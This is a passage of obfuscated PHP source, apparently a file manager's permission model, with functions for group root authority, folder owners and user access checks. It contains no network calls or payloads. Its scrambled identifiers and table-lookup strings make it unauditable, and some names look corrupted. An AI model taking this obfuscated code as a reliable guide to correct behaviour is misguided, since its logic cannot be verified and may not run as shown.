unset($À©½áÃ[$Á¡ŠºÕ[90]]); $£€¡¬­ = $•«óùğ»[$À©½áÃ[$Á¡ŠºÕ[193]]]; if (!$£€¡¬­) { continue; } $À©½áÃ[$Á¡ŠºÕ[2156]] = $this->authTargetInfo($£€¡¬­); $À©½áÃ[$Á¡ŠºÕ[582]] = rtrim($À©½áÃ[$Á¡ŠºÕ[588]], $Á¡ŠºÕ[8]) . $Á¡ŠºÕ[8] . ltrim($À©½áÃ[$Á¡ŠºÕ[582]], $Á¡ŠºÕ[8]); $Œä‹àú²[] = $À©½áÃ; $·£æúÜà = count(explode($Á¡ŠºÕ[8], trim($À©½áÃ[$Á¡ŠºÕ[582]], $Á¡ŠºÕ[8]))); $Î¯É¬ÙÓ[] = $·£æúÜà + ($À©½áÃ[$Á¡ŠºÕ[33]] == $Á¡ŠºÕ[78] ? 0 : 1000); } array_multisort($Î¯É¬ÙÓ, SORT_ASC, $Œä‹àú²); return $Œä‹àú²; } private function groupChidldAllRootSource($à°«ê£§) { $œÜ¬ı¥Æ =& $_SERVER[¢ñàß¿€]; $ƒÜ¿áãî = Model($œÜ¬ı¥Æ[2157])->groupChildrenAll($à°«ê£§); $ÀŞ¹êÒ = array($œÜ¬ı¥Æ[192] => 0, $œÜ¬ı¥Æ[569] => array($œÜ¬ı¥Æ[7], $ƒÜ¿áãî), $œÜ¬ı¥Æ[190] => SourceModel::TYPE_GROUP); $»¹ã—“ï = Model($œÜ¬ı¥Æ[895])->field($œÜ¬ı¥Æ[193])->where($ÀŞ¹êÒ)->select(); $»¹ã—“ï = array_to_keyvalue($»¹ã—“ï, $œÜ¬ı¥Æ[12], $œÜ¬ı¥Æ[193]); return $»¹ã—“ï; } private function authTargetInfo($¡§¸ËÏ–) { $ÊÕÅ¦Î¸ =& $_SERVER[¢ñàß¿€]; $‹áĞ‚Ñ = array(); $Ç’¢“É = array(); $¿È¼Õ = 2 << 25; foreach ($¡§¸ËÏ– as $˜ã˜Œ€) { $Ÿçï»ç = Model($ÊÕÅ¦Î¸[571])->listData($˜ã˜Œ€[$ÊÕÅ¦Î¸[2076]]); if (!$Ÿçï»ç) { continue; } if ($˜ã˜Œ€[$ÊÕÅ¦Î¸[190]] == SourceModel::TYPE_USER) { $Å ¬Ğ‚İ = Model($ÊÕÅ¦Î¸[577])->getInfoSimpleOuter($˜ã˜Œ€[$ÊÕÅ¦Î¸[569]]); if ($Å ¬Ğ‚İ[$ÊÕÅ¦Î¸[1770]] == $ÊÕÅ¦Î¸[1270]) { continue; } if ($Å ¬Ğ‚İ[$ÊÕÅ¦Î¸[1770]] == $ÊÕÅ¦Î¸[228]) { $Å ¬Ğ‚İ[$ÊÕÅ¦Î¸[32]] = LNG($ÊÕÅ¦Î¸[2158]); } } else { $Å ¬Ğ‚İ = Model($ÊÕÅ¦Î¸[585])->getInfoSimple($˜ã˜Œ€[$ÊÕÅ¦Î¸[569]]); } if (!$Å ¬Ğ‚İ) { continue; } $Å ¬Ğ‚İ[$ÊÕÅ¦Î¸[540]] = $Ÿçï»ç; $‹áĞ‚Ñ[] = $Å ¬Ğ‚İ; $ü…Â‚ã = 0; if ($˜ã˜Œ€[$ÊÕÅ¦Î¸[190]] == SourceModel::TYPE_GROUP) { $ü…Â‚ã = $¿È¼Õ * 2; } if ($˜ã˜Œ€[$ÊÕÅ¦Î¸[190]] == SourceModel::TYPE_USER) { $ü…Â‚ã = $¿È¼Õ; } if ($˜ã˜Œ€[$ÊÕÅ¦Î¸[190]] == SourceModel::TYPE_USER && $˜ã˜Œ€[$ÊÕÅ¦Î¸[569]] == $ÊÕÅ¦Î¸[228]) { $ü…Â‚ã = 0; } $Ç’¢“É[] = $Ÿçï»ç[$ÊÕÅ¦Î¸[487]] + $ü…Â‚ã; } array_multisort($Ç’¢“É, SORT_DESC, $‹áĞ‚Ñ); return $‹áĞ‚Ñ; } public function getAllChildrenByUser($¡×Éê£, $÷¡¬á¯ê) { $¸ùÆŒ·¹ =& $_SERVER[¢ñàß¿€]; $èƒÀõ = Model($¸ùÆŒ·¹[598])->getInfo($÷¡¬á¯ê); if (!$÷¡¬á¯ê || !$¡×Éê£ || !$èƒÀõ) { return array(); } $ª Ëå = Model($¸ùÆŒ·¹[1414])->sourceInfo($¡×Éê£); $ƒ¾ãœÉÔ = array(); $ÍÊÂœ½û = 1; if ($ª Ëå[$¸ùÆŒ·¹[192]] == $¸ùÆŒ·¹[228] && $ª Ëå[$¸ùÆŒ·¹[569]] != $ÍÊÂœ½û && $this->groupContainUser($ª Ëå[$¸ùÆŒ·¹[569]], $÷¡¬á¯ê)) { foreach ($èƒÀõ[$¸ùÆŒ·¹[2159]] as $ï—Ğêñá) { $•ıö¶Ÿ = Model($¸ùÆŒ·¹[585])->getInfo($ï—Ğêñá[$¸ùÆŒ·¹[1968]]); $‘Ûæ–Õ = Model($¸ùÆŒ·¹[598])->getInfoSimpleOuter($÷¡¬á¯ê); $‘Ûæ–Õ[$¸ùÆŒ·¹[540]] = $ï—Ğêñá[$¸ùÆŒ·¹[487]]; if (Model($¸ùÆŒ·¹[571])->authCheckAction($ï—Ğêñá[$¸ùÆŒ·¹[487]][$¸ùÆŒ·¹[487]], $¸ùÆŒ·¹[1989])) { continue; } $¹ï–‡— = array($¸ùÆŒ·¹[32] => $¸ùÆŒ·¹[1290] . $•ıö¶Ÿ[$¸ùÆŒ·¹[32]], $¸ùÆŒ·¹[193] => $•ıö¶Ÿ[$¸ùÆŒ·¹[90]][$¸ùÆŒ·¹[193]], $¸ùÆŒ·¹[87] => KodIO::make($•ıö¶Ÿ[$¸ùÆŒ·¹[90]][$¸ùÆŒ·¹[193]]), $¸ùÆŒ·¹[192] => $¸ùÆŒ·¹[228], $¸ùÆŒ·¹[190] => $¸ùÆŒ·¹[578], $¸ùÆŒ·¹[33] => $¸ùÆŒ·¹[616], $¸ùÆŒ·¹[582] => $•ıö¶Ÿ[$¸ùÆŒ·¹[589]], $¸ùÆŒ·¹[1968] => $•ıö¶Ÿ[$¸ùÆŒ·¹[1968]], $¸ùÆŒ·¹[586] => $•ıö¶Ÿ[$¸ùÆŒ·¹[192]], $¸ùÆŒ·¹[2156] => array($‘Ûæ–Õ)); $ƒ¾ãœÉÔ[$¹ï–‡—[$¸ùÆŒ·¹[193]]] = $¹ï–‡—; } } $©Ğ¤ÌÒ = array(); $ËÒ‰›‡ú = $this->getAllChildren($¡×Éê£); foreach ($ËÒ‰›‡ú as $€·ÑƒûÌ) { $‘´‹µÏ = !1; foreach ($€·ÑƒûÌ[$¸ùÆŒ·¹[2156]] as $ÕÌÎšÏ) { if ($ÕÌÎšÏ[$¸ùÆŒ·¹[1770]]) { if ($ÕÌÎšÏ[$¸ùÆŒ·¹[1770]] == $÷¡¬á¯ê) { $‘´‹µÏ = !0; break; } } if ($ÕÌÎšÏ[$¸ùÆŒ·¹[1968]]) { if ($this->groupContainUser($ÕÌÎšÏ[$¸ùÆŒ·¹[1968]], $÷¡¬á¯ê)) { $‘´‹µÏ = !0; break; } } } if ($‘´‹µÏ) { $©Ğ¤ÌÒ[] = $€·ÑƒûÌ; } $Ã‚ˆ¡Ø = $€·ÑƒûÌ[$¸ùÆŒ·¹[193]]; if (isset($ƒ¾ãœÉÔ[$Ã‚ˆ¡Ø])) { $€·ÑƒûÌ[$¸ùÆŒ·¹[2156]][] = $ƒ¾ãœÉÔ[$Ã‚ˆ¡Ø][0]; $ƒ¾ãœÉÔ[$Ã‚ˆ¡Ø] = !1; } } $ƒ¾ãœÉÔ = array_filter(array_values($ƒ¾ãœÉÔ)); $©Ğ¤ÌÒ = array_merge($ƒ¾ãœÉÔ, $©Ğ¤ÌÒ); return $©Ğ¤ÌÒ; } public function setAllChildrenByUser($™Â®—, $š¨ğ£È, $¯Ü‰ÇñŞ) { $ûæ™Òş› =& $_SERVER[¢ñàß¿€]; $Ë…ôó…€ = $this->getAllChildrenByUser($™Â®—, $š¨ğ£È); if (!$¯Ü‰ÇñŞ || !$Ë…ôó…€) { return !1; } foreach ($Ë…ôó…€ as $”×‹ÆĞŸ) { $øÏ‘¼•Û = array(); foreach ($”×‹ÆĞŸ[$ûæ™Òş›[2156]] as $Ç§Úˆñ¢) { $Á§ğş·¹ = $Ç§Úˆñ¢[$ûæ™Òş›[540]]; $¦Ãâ¢ñ = $Ç§Úˆñ¢[$ûæ™Òş›[1770]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $·ïÓû»ˆ = $Ç§Úˆñ¢[$ûæ™Òş›[1770]] ? $Ç§Úˆñ¢[$ûæ™Òş›[1770]] : $Ç§Úˆñ¢[$ûæ™Òş›[1968]]; if ($Ç§Úˆñ¢[$ûæ™Òş›[1770]] && $Ç§Úˆñ¢[$ûæ™Òş›[1770]] == $š¨ğ£È) { continue; } $øÏ‘¼•Û[] = array($ûæ™Òş›[193] => $”×‹ÆĞŸ[$ûæ™Òş›[193]], $ûæ™Òş›[190] => $¦Ãâ¢ñ, $ûæ™Òş›[569] => intval($·ïÓû»ˆ), $ûæ™Òş›[2076] => isset($Á§ğş·¹[$ûæ™Òş›[475]]) ? intval($Á§ğş·¹[$ûæ™Òş›[475]]) : 0, $ûæ™Òş›[2136] => isset($Á§ğş·¹[$ûæ™Òş›[2136]]) ? intval($Á§ğş·¹[$ûæ™Òş›[2136]]) : -1); } $øÏ‘¼•Û[] = array($ûæ™Òş›[193] => $”×‹ÆĞŸ[$ûæ™Òş›[193]], $ûæ™Òş›[190] => SourceModel::TYPE_USER, $ûæ™Òş›[569] => intval($š¨ğ£È), $ûæ™Òş›[2076] => intval($¯Ü‰ÇñŞ), $ûæ™Òş›[2136] => -1); $this->where(array($ûæ™Òş›[491] => $”×‹ÆĞŸ[$ûæ™Òş›[193]]))->delete(); $this->addAll($øÏ‘¼•Û); } return !0; } public function get($±í®Ñóğ) { $Ü‘ÈÔ× = $this->getSourceList(array($±í®Ñóğ), !0); return $Ü‘ÈÔ×[0]; } public function getSourceList($–˜ˆ²İ…, $ùØ¤÷Æ• = false, $Œ¥±ÛÀ® = false) { $Òä‚ÚıÂ =& $_SERVER[¢ñàß¿€]; if (!$–˜ˆ²İ…) { return array(); } $åÃÅâ… = Model($Òä‚ÚıÂ[1414]); if (!$ùØ¤÷Æ• && count($–˜ˆ²İ…) == 1) { $ùØ¤÷Æ• = array(); $ùØ¤÷Æ•[$–˜ˆ²İ…[0]] = $åÃÅâ…->sourceInfo($–˜ˆ²İ…[0]); } if (!$ùØ¤÷Æ•) { $“±ı¡¦ = array($Òä‚ÚıÂ[491] => array($Òä‚ÚıÂ[492], $–˜ˆ²İ…)); $ùØ¤÷Æ• = $åÃÅâ…->field($Òä‚ÚıÂ[2160])->where($“±ı¡¦)->select(); $ùØ¤÷Æ• = array_to_keyvalue($ùØ¤÷Æ•, $Òä‚ÚıÂ[193]); } $óÜŞ‹ö‡ = $–˜ˆ²İ…; foreach ($ùØ¤÷Æ• as $êàÎôÜ => $Åƒ’ô­) { $ú„†ö™½ = $åÃÅâ…->parentLevelArray($Åƒ’ô­[$Òä‚ÚıÂ[584]]); $óÜŞ‹ö‡ = array_merge($óÜŞ‹ö‡, array($êàÎôÜ), array_reverse($ú„†ö™½)); } $óÜŞ‹ö‡ = array_values(array_unique($óÜŞ‹ö‡)); if (!$óÜŞ‹ö‡) { return array(); } $´—²ï» = $this->sourceAuthSelect($óÜŞ‹ö‡); $ß†¥Ã¨é = array(); foreach ($óÜŞ‹ö‡ as $ŸÄ‘…’Ï) { if (isset($´—²ï»[$ŸÄ‘…’Ï])) { $ß†¥Ã¨é[$ŸÄ‘…’Ï] = $´—²ï»[$ŸÄ‘…’Ï]; } } $é¨ËÙ­Ó = $this->userIsRoot($Œ¥±ÛÀ®); $¦Ä¸ÉÇ“ = AuthModel::authAll(); $õÇø•‹è = array($Òä‚ÚıÂ[488] => $¦Ä¸ÉÇ“, $Òä‚ÚıÂ[2161] => array($Òä‚ÚıÂ[493] => 0, $Òä‚ÚıÂ[1974] => $¦Ä¸ÉÇ“, $Òä‚ÚıÂ[494] => LNG($Òä‚ÚıÂ[2162]), $Òä‚ÚıÂ[1991] => $Òä‚ÚıÂ[2163])); $ìÄïÓ£· = array(); foreach ($ùØ¤÷Æ• as $ŸÄ‘…’Ï => $õŞ™ö¢) { if ($é¨ËÙ­Ó && $GLOBALS[$Òä‚ÚıÂ[6]][$Òä‚ÚıÂ[1987]]) { $ìÄïÓ£·[$ŸÄ‘…’Ï] = $õÇø•‹è; continue; } $ìÄïÓ£·[$ŸÄ‘…’Ï] = $this->makeSourceAuth($õŞ™ö¢, $ß†¥Ã¨é, $Œ¥±ÛÀ®); } return $ìÄïÓ£·; } public function authDeepCheck($Õùß”›, $‚øè±«— = false) { $ƒ×Ùªˆœ =& $_SERVER[¢ñàß¿€]; $‚øè±«— = $‚øè±«— ? $‚øè±«— : USER_ID; $ï™¼ÔŸ’ = $this->makeAuthDeep($‚øè±«—); if (!in_array($Õùß”›, $ï™¼ÔŸ’[$ƒ×Ùªˆœ[2164]])) { return !1; } $“×¸’§ = array(); foreach ($ï™¼ÔŸ’[$ƒ×Ùªˆœ[2165]] as $ĞñÎı‹÷ => $€¨ÔÏŠ) { if (!in_array($Õùß”›, $€¨ÔÏŠ)) { continue; } $“×¸’§[] = $ĞñÎı‹÷; } if (!$“×¸’§) { return !1; } $Éùæƒ› = $“×¸’§ ? $“×¸’§[0] : $Õùß”›; return array($ƒ×Ùªˆœ[488] => -1, $ƒ×Ùªˆœ[540] => array($ƒ×Ùªˆœ[493] => $ƒ×Ùªˆœ[1270], $ƒ×Ùªˆœ[1974] => $ƒ×Ùªˆœ[228], $ƒ×Ùªˆœ[494] => LNG($ƒ×Ùªˆœ[2166]), $ƒ×Ùªˆœ[1991] => $ƒ×Ùªˆœ[2167]), $ƒ×Ùªˆœ[2168] => LNG($ƒ×Ùªˆœ[2169]), $ƒ×Ùªˆœ[2170] => $this->sourceAuthInfo($Éùæƒ›)); } protected function makeAuthDeep($¾³µç«Õ = false) { $ƒÓğ®û‘ =& $_SERVER[¢ñàß¿€]; static $ÔŒçõ¥„ = array(); $¾³µç«Õ = $¾³µç«Õ ? $¾³µç«Õ : USER_ID; if (isset($ÔŒçõ¥„[$¾³µç«Õ])) { return $ÔŒçõ¥„[$¾³µç«Õ]; } $Œ®…½Ò = Model($ƒÓğ®û‘[2171])->listData(); $È£µÉ¼“ = array(); foreach ($Œ®…½Ò as $á°£È—ğ) { if ($á°£È—ğ[$ƒÓğ®û‘[487]] == 0 && $á°£È—ğ[$ƒÓğ®û‘[1990]] == $ƒÓğ®û‘[91]) { $È£µÉ¼“[] = $á°£È—ğ[$ƒÓğ®û‘[475]]; } } $‚Íø¬ã = $this->userGroupParents($¾³µç«Õ); $¦¢ˆÏš = array($ƒÓğ®û‘[190] => SourceModel::TYPE_USER, $ƒÓğ®û‘[569] => $¾³µç«Õ); if ($‚Íø¬ã) { $¦¢ˆÏš = array(array($ƒÓğ®û‘[190] => SourceModel::TYPE_USER, $ƒÓğ®û‘[569] => $¾³µç«Õ), array($ƒÓğ®û‘[190] => SourceModel::TYPE_GROUP, $ƒÓğ®û‘[569] => array($ƒÓğ®û‘[492], $‚Íø¬ã)), $ƒÓğ®û‘[1075] => $ƒÓğ®û‘[2070]); } $Ÿòœ¾á™ = $this->field($ƒÓğ®û‘[2172])->where($¦¢ˆÏš)->select(); $„¼øÅğÎ = array(); $÷æ³çµ± = array_to_keyvalue_group($Ÿòœ¾á™, $ƒÓğ®û‘[193]); foreach ($÷æ³çµ± as $–§‡Ğ÷Ò => $ëıÔ‚€) { $ã­€ü = $this->authArrayCheck($ëıÔ‚€, $¾³µç«Õ); if ($ã­€ü[$ƒÓğ®û‘[488]] > 0) { $„¼øÅğÎ[] = $–§‡Ğ÷Ò . $ƒÓğ®û‘[12]; } } if ($‚Íø¬ã) { $ƒÜë°Â½ = Model($ƒÓğ®û‘[585]); foreach ($‚Íø¬ã as $Íñ¼•ü) { $ªˆŞ«ú¾ = $ƒÜë°Â½->getInfo($Íñ¼•ü); if (!$ªˆŞ«ú¾ || !is_array($ªˆŞ«ú¾[$ƒÓğ®û‘[90]])) { continue; } $„¼øÅğÎ[] = $ªˆŞ«ú¾[$ƒÓğ®û‘[90]][$ƒÓğ®û‘[193]]; } } $šÇÜèõç = array(); $ÙÄÏàº’ = $‚Íø¬ã; $óÙ”íòã = Model($ƒÓğ®û‘[1414]); $ƒÜë°Â½ = Model($ƒÓğ®û‘[585]); $»¤ØÜ·µ = array(); $É™úç« = array(); $ÖàŸ¡ìÍ = array(); $×¡¶¹Œ¾ = array(); if ($„¼øÅğÎ) { $³øª¶§ˆ = $óÙ”íòã->where(array($ƒÓğ®û‘[193] => array($ƒÓğ®û‘[492], $„¼øÅğÎ)))->select(); foreach ($³øª¶§ˆ as $ËÉÛé·§) { $‹˜¹‘° = $óÙ”íòã->parentLevelArray($ËÉÛé·§[$ƒÓğ®û‘[584]]); $šÇÜèõç = array_merge($šÇÜèõç, $‹˜¹‘°); $ÙÄÏàº’[] = $ËÉÛé·§[$ƒÓğ®û‘[569]]; $»¤ØÜ·µ[$ËÉÛé·§[$ƒÓğ®û‘[193]]] = $‹˜¹‘°; $É™úç«[$ËÉÛé·§[$ƒÓğ®û‘[193]]] = $ËÉÛé·§[$ƒÓğ®û‘[569]]; } } $ÙÄÏàº’ = array_values(array_unique($ÙÄÏàº’)); $£Á„îÆ“ = $ÙÄÏàº’; foreach ($£Á„îÆ“ as $Íñ¼•ü) { $ªˆŞ«ú¾ = $ƒÜë°Â½->getInfo($Íñ¼•ü); $‹˜¹‘° = $óÙ”íòã->parentLevelArray($ªˆŞ«ú¾[$ƒÓğ®û‘[584]]); $ÙÄÏàº’ = array_merge($ÙÄÏàº’, $‹˜¹‘°); } $ÙÄÏàº’ = array_values(array_unique($ÙÄÏàº’)); foreach ($ÙÄÏàº’ as $Íñ¼•ü) { $ªˆŞ«ú¾ = $ƒÜë°Â½->getInfo($Íñ¼•ü); $šÇÜèõç[] = $ªˆŞ«ú¾[$ƒÓğ®û‘[90]][$ƒÓğ®û‘[193]]; $ÖàŸ¡ìÍ[$Íñ¼•ü] = $ªˆŞ«ú¾[$ƒÓğ®û‘[90]][$ƒÓğ®û‘[193]]; $×¡¶¹Œ¾[$Íñ¼•ü] = $óÙ”íòã->parentLevelArray($ªˆŞ«ú¾[$ƒÓğ®û‘[584]]); } foreach ($»¤ØÜ·µ as $¡¶¶­å => $¯«üçÓ÷) { $ñÀÊ©áç = $É™úç«[$¡¶¶­å]; if (!$ñÀÊ©áç || !$ÖàŸ¡ìÍ[$ñÀÊ©áç]) { continue; } $ôÍë»Á = array(); foreach ($×¡¶¹Œ¾[$ñÀÊ©áç] as $Íñ¼•ü) { $ôÍë»Á[] = $ÖàŸ¡ìÍ[$Íñ¼•ü]; } $»¤ØÜ·µ[$¡¶¶­å] = array_merge($ôÍë»Á, $¯«üçÓ÷); } $šÇÜèõç = array_values(array_unique($šÇÜèõç)); $Ó°©õŞ– = array($ƒÓğ®û‘[2164] => $šÇÜèõç, $ƒÓğ®û‘[2165] => $»¤ØÜ·µ); $ÔŒçõ¥„[$¾³µç«Õ] = $Ó°©õŞ–; return $Ó°©õŞ–; } private function makeSourceAuth($ì„¹ì«†, $©¥ñ—á, $ÇŸ˜ÚÀ¹ = false) { $§¯ã“ïŠ =& $_SERVER[¢ñàß¿€]; $–œÓ®ñ½ = $§¯ã“ïŠ[91]; $òÎŞ¢ï× = $ì„¹ì«†[$§¯ã“ïŠ[569]]; $«ã‡ô¾ğ = $ì„¹ì«†[$§¯ã“ïŠ[190]] == SourceModel::TYPE_GROUP; $èòæ¨÷ = $«ã‡ô¾ğ ? $this->groupRootAuth($òÎŞ¢ï×, $ÇŸ˜ÚÀ¹) : !1; if ($èòæ¨÷ && Model($§¯ã“ïŠ[571])->authCheckAction($èòæ¨÷[$§¯ã“ïŠ[487]], $§¯ã“ïŠ[1989])) { return $this->groupAuthInfo($èòæ¨÷, $òÎŞ¢ï×); } $‰™ÆÃÊ¥ = Model($§¯ã“ïŠ[1414])->parentLevelArray($ì„¹ì«†[$§¯ã“ïŠ[584]]); $‰™ÆÃÊ¥ = array_merge(array($ì„¹ì«†[$§¯ã“ïŠ[193]]), array_reverse($‰™ÆÃÊ¥)); $–¹•İË÷ = !1; foreach ($‰™ÆÃÊ¥ as $ğÊÌˆ‚Ñ) { if (!isset($©¥ñ—á[$ğÊÌˆ‚Ñ])) { continue; } $İ•±·Ì¸ = $this->authMake($©¥ñ—á[$ğÊÌˆ‚Ñ], $ÇŸ˜ÚÀ¹); if ($İ•±·Ì¸[$§¯ã“ïŠ[540]]) { $–¹•İË÷ = $İ•±·Ì¸; break; } } if (!$«ã‡ô¾ğ) { return $–¹•İË÷; } if (!$–¹•İË÷ && $èòæ¨÷) { $–¹•İË÷ = $this->groupAuthInfo($èòæ¨÷, $òÎŞ¢ï×); } if (!$–¹•İË÷) { $Ş“ªñµç = Model($§¯ã“ïŠ[585])->getInfo($òÎŞ¢ï×); $–»ÇÍæ = explode($§¯ã“ïŠ[50], trim($Ş“ªñµç[$§¯ã“ïŠ[584]], $§¯ã“ïŠ[50])); $–»ÇÍæ = array_reverse($–»ÇÍæ); foreach ($–»ÇÍæ as $‡şØæó‰) { if ($‡şØæó‰ == $§¯ã“ïŠ[228] || $‡şØæó‰ == $–œÓ®ñ½) { continue; } $¥ªâ™»Ô = $this->groupRootAuth($‡şØæó‰, $ÇŸ˜ÚÀ¹); if (!$¥ªâ™»Ô) { continue; } $–¹•İË÷ = $this->groupAuthInfo($¥ªâ™»Ô, $‡şØæó‰); break; } } if (!$–¹•İË÷ || $–¹•İË÷[$§¯ã“ïŠ[488]] <= 0) { $¨»³ò€Ú = $this->authDeepCheck($ì„¹ì«†[$§¯ã“ïŠ[193]], $ÇŸ˜ÚÀ¹); if ($¨»³ò€Ú) { $–¹•İË÷ = $¨»³ò€Ú; } } return $–¹•İË÷; } private function userIsRoot($ƒ±şòÂî = false) { $ªÏŠÅÚ£ =& $_SERVER[¢ñàß¿€]; if (!$ƒ±şòÂî && KodUser::isRoot()) { return !0; } $Êû²ÓÂ = Model($ªÏŠÅÚ£[598])->getInfo($ƒ±şòÂî); $ûÅ÷âá‡ = Model($ªÏŠÅÚ£[2173])->listData($Êû²ÓÂ[$ªÏŠÅÚ£[2174]]); if ($ûÅ÷âá‡ && $ûÅ÷âá‡[$ªÏŠÅÚ£[575]][$ªÏŠÅÚ£[2175]] == 1) { return !0; } return !1; } private function sourceAuthInfo($±­Ö±ù¬) { $˜ƒ¯ÜÇÌ =& $_SERVER[¢ñàß¿€]; $Ä¹—™¿¬ = Model($˜ƒ¯ÜÇÌ[1414]); $­ÍøşºŞ = $Ä¹—™¿¬->sourceInfo($±­Ö±ù¬); if (!$­ÍøşºŞ) { return !1; } $Ä¹—™¿¬->groupPathDisplay($­ÍøşºŞ); $º›“Ô•ø = array($­ÍøşºŞ); $º›“Ô•ø = $Ä¹—™¿¬->_listAppendPath($º›“Ô•ø); $­ÍøşºŞ = $º›“Ô•ø[0]; $…İ…¶Ê— = $­ÍøşºŞ[$˜ƒ¯ÜÇÌ[582]]; if (isset($­ÍøşºŞ[$˜ƒ¯ÜÇÌ[590]])) { $Å·¯Ÿş = explode($˜ƒ¯ÜÇÌ[8], trim($­ÍøşºŞ[$˜ƒ¯ÜÇÌ[582]], $˜ƒ¯ÜÇÌ[8])); array_shift($Å·¯Ÿş); $…İ…¶Ê— = $­ÍøşºŞ[$˜ƒ¯ÜÇÌ[588]] . $˜ƒ¯ÜÇÌ[2176] . implode($˜ƒ¯ÜÇÌ[8], $Å·¯Ÿş); } return array($˜ƒ¯ÜÇÌ[494] => $­ÍøşºŞ[$˜ƒ¯ÜÇÌ[32]], $˜ƒ¯ÜÇÌ[87] => KodIO::make($­ÍøşºŞ[$˜ƒ¯ÜÇÌ[193]]), $˜ƒ¯ÜÇÌ[2177] => $…İ…¶Ê—); } private function groupAuthInfo($—€ÆßËÔ, $£úàßı) { $óßş¶úğ =& $_SERVER[¢ñàß¿€]; $ßâØ’ËŠ = Model($óßş¶úğ[585])->getInfo($£úàßı); return array($óßş¶úğ[2178] => intval($—€ÆßËÔ[$óßş¶úğ[487]]), $óßş¶úğ[2161] => $—€ÆßËÔ, $óßş¶úğ[2179] => LNG($óßş¶úğ[2180]), $óßş¶úğ[2170] => array($óßş¶úğ[494] => $ßâØ’ËŠ[$óßş¶úğ[32]], $óßş¶úğ[87] => KodIO::make($ßâØ’ËŠ[$óßş¶úğ[90]][$óßş¶úğ[193]]), $óßş¶úğ[2177] => $ßâØ’ËŠ[$óßş¶úğ[589]])); } protected function groupRootAuth($ÓîÂı¢€, $• Îêéš = false) { $ôæ–Ùû” =& $_SERVER[¢ñàß¿€]; $• Îêéš = $• Îêéš ? $• Îêéš : USER_ID; $ê¡¥‡Õ­ = $• Îêéš . $ôæ–Ùû”[2181] . $ÓîÂı¢€; static $ÃˆõŒ…ù = array(); if (isset($ÃˆõŒ…ù[$ê¡¥‡Õ­])) { return $ÃˆõŒ…ù[$ê¡¥‡Õ­]; } $ó«Îã”Ò = Model($ôæ–Ùû”[585])->getInfo($ÓîÂı¢€); $ğüş½ = $this->userGroupList($• Îêéš); $æ¿¢Ó†ı = isset($ğüş½[$ÓîÂı¢€]) ? $ğüş½[$ÓîÂı¢€][$ôæ–Ùû”[487]] : !1; if ($æ¿¢Ó†ı && Model($ôæ–Ùû”[571])->authCheckAction($æ¿¢Ó†ı[$ôæ–Ùû”[487]], $ôæ–Ùû”[1989])) { $ÃˆõŒ…ù[$ê¡¥‡Õ­] = $æ¿¢Ó†ı; return $æ¿¢Ó†ı; } $óº‹šÆû = $this->sourceAuthSelect($ó«Îã”Ò[$ôæ–Ùû”[90]][$ôæ–Ùû”[193]]); $£Ô•Íù§ = $óº‹šÆû ? $this->authMake($óº‹šÆû, $• Îêéš) : !1; $¦¦âÊÄ = $£Ô•Íù§ ? $£Ô•Íù§[$ôæ–Ùû”[540]] : !1; $ÃˆõŒ…ù[$ê¡¥‡Õ­] = $¦¦âÊÄ ? $¦¦âÊÄ : $æ¿¢Ó†ı; return $ÃˆõŒ…ù[$ê¡¥‡Õ­]; } public function authOwnerApply($“´ûàéñ) { $§ğò®ƒ½ =& $_SERVER[¢ñàß¿€]; if (empty($“´ûàéñ[$§ğò®ƒ½[487]]) || isset($“´ûàéñ[$§ğò®ƒ½[2182]]) && $“´ûàéñ[$§ğò®ƒ½[2182]]) { return $“´ûàéñ; } if (AuthModel::authCheckRoot($“´ûàéñ[$§ğò®ƒ½[487]][$§ğò®ƒ½[488]])) { return $“´ûàéñ; } $ğÇÉ°¸È = Model($§ğò®ƒ½[1414])->parentLevelArray($“´ûàéñ[$§ğò®ƒ½[584]]); $ğÇÉ°¸È = array_merge(array($“´ûàéñ[$§ğò®ƒ½[193]]), array_reverse($ğÇÉ°¸È)); $ºíòşú = $this->sourceAuthSelect($ğÇÉ°¸È); $óúåÊä¢ = array(); $•­½­ĞÂ = array(); foreach ($ºíòşú as $öÈ±ÇÄÔ => $áÜ‹Âß) { $ü­¯¼• = $this->authFolderOwnerUser($áÜ‹Âß); $óúåÊä¢[$öÈ±ÇÄÔ] = $ü­¯¼•; $•­½­ĞÂ = array_merge($•­½­ĞÂ, $ü­¯¼•[$§ğò®ƒ½[662]]); if ($ü­¯¼•[$§ğò®ƒ½[2183]]) { break; } } if (count($•­½­ĞÂ) == 0) { $•­½­ĞÂ = $this->authFolderOwnerGroup($“´ûàéñ[$§ğò®ƒ½[569]]); } $•­½­ĞÂ = array_unique($•­½­ĞÂ); if (AuthModel::authCheckRoot($“´ûàéñ[$§ğò®ƒ½[487]][$§ğò®ƒ½[488]])) { $•­½­ĞÂ[] = USER_ID; } $“´ûàéñ[$§ğò®ƒ½[487]][$§ğò®ƒ½[2184]] = Model($§ğò®ƒ½[577])->userListInfo($•­½­ĞÂ); return $“´ûàéñ; } private function authFolderOwnerGroup($Û×Û³ìº) { $¹şƒà§ª =& $_SERVER[¢ñàß¿€]; $»Úú‡…œ = Model($¹şƒà§ª[2062])->where(array($¹şƒà§ª[1968] => $Û×Û³ìº))->select(); $ëäœõ‚œ = array(); if (!$»Úú‡…œ) { return $ëäœõ‚œ; } foreach ($»Úú‡…œ as $­£¶Šá) { $‰üÄ­õÆ = $this->authInfo($­£¶Šá); if (AuthModel::authCheckRoot($‰üÄ­õÆ[$¹şƒà§ª[487]])) { $ëäœõ‚œ[] = $­£¶Šá[$¹şƒà§ª[1770]]; } } return $ëäœõ‚œ; } private function authFolderOwnerUser($Ğ«ÕèØ…) { $ŸıÂ¡¤Ö =& $_SERVER[¢ñàß¿€]; $¦·÷¡®¦ = array(); $È´—³èŞ = !1; foreach ($Ğ«ÕèØ… as $Ê³§Ÿã) { $Å§‡›Ÿ = $this->authInfo($Ê³§Ÿã); if ($Ê³§Ÿã[$ŸıÂ¡¤Ö[569]] == $ŸıÂ¡¤Ö[228]) { $È´—³èŞ = !0; } if ($Ê³§Ÿã[$ŸıÂ¡¤Ö[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Å§‡›Ÿ[$ŸıÂ¡¤Ö[487]])) { $¦·÷¡®¦[] = $Ê³§Ÿã[$ŸıÂ¡¤Ö[569]]; } } } return array($ŸıÂ¡¤Ö[662] => $¦·÷¡®¦, $ŸıÂ¡¤Ö[2183] => $È´—³èŞ); } public function authMake($µ’œŒĞ®, $ñŞˆŞ¹ò = false) { $•í™¢›‹ =& $_SERVER[¢ñàß¿€]; $—‘Ù–ßè = $this->authArrayCheck($µ’œŒĞ®, 